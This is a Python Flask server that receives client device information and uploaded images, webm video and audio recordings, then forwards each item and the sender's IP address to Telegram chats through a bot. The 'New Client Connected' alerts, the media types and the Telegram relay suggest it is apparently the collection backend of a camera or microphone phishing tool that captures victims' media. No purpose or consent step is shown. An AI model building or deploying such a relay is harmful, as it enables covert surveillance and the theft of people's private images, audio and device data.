import os
import tempfile
import requests
from flask import Flask, request, jsonify, render_template

app = Flask(__name__, template_folder="templates")

# ================= CONFIG =================
BOT_TOKEN = os.environ.get("TG_BOT_TOKEN")
# Comma-separated chat IDs, e.g. "123456789,-100987654321"
CHAT_IDS = [cid.strip() for cid in os.environ.get("TG_CHAT_ID", "").split(",") if cid.strip()]
SECRET_TOKEN = os.environ.get("SECRET_TOKEN")

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

MAX_FILE = 12 * 1024 * 1024
ALLOWED = {"jpg", "jpeg", "png", "webm", "mp3", "m4a", "wav", "ogg"}
# =========================================


def tg_send_text(text):
    for chat_id in CHAT_IDS:
        try:
            requests.post(
                f"{TG_API}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": text,
                    "parse_mode": "Markdown"
                },
                timeout=20
            )
        except Exception:
            pass


def tg_send_file(file_path, filename):
    for chat_id in CHAT_IDS:
        try:
            with open(file_path, "rb") as f:
                requests.post(
                    f"{TG_API}/sendDocument",
                    data={"chat_id": chat_id},
                    files={"document": (filename, f)},
                    timeout=60
                )
        except Exception:
            pass


@app.route("/")
def index():
    return render_template("index.html", SECRET_TOKEN=SECRET_TOKEN)


@app.route("/upload", methods=["POST"])
def upload():
    token = request.form.get("token", "")
    if token != SECRET_TOKEN:
        return jsonify({"ok": False, "err": "bad token"}), 401

    typ = request.form.get("type", "")

    # -------- INFO --------
    if typ == "info":
        info = request.form.get("info", "")
        remote = request.remote_addr
        msg = (
            "📡 *New Client Connected*\n\n"
            f"{info}\n\n"
            f"🌍 Server IP: `{remote}`"
        )
        tg_send_text(msg)
        return jsonify({"ok": True}), 200

    # -------- FILE --------
    if "file" not in request.files:
        return jsonify({"ok": False, "err": "no file"}), 400

    f = request.files["file"]
    fname = f.filename
    ext = fname.split(".")[-1].lower()

    if ext not in ALLOWED:
        return jsonify({"ok": False, "err": "bad ext"}), 415

    f.seek(0, 2)
    size = f.tell()
    f.seek(0)

    if size > MAX_FILE:
        return jsonify({"ok": False, "err": "file too large"}), 413

    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        tmp_name = tmp.name
        f.save(tmp_name)

    try:
        tg_send_text(
            f"📂 *New File*\n"
            f"📄 Name: `{fname}`\n"
            f"📦 Size: `{size}` bytes"
        )
        tg_send_file(tmp_name, fname)
    finally:
        try:
            os.remove(tmp_name)
        except Exception:
            pass

    return jsonify({"ok": True}), 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port)
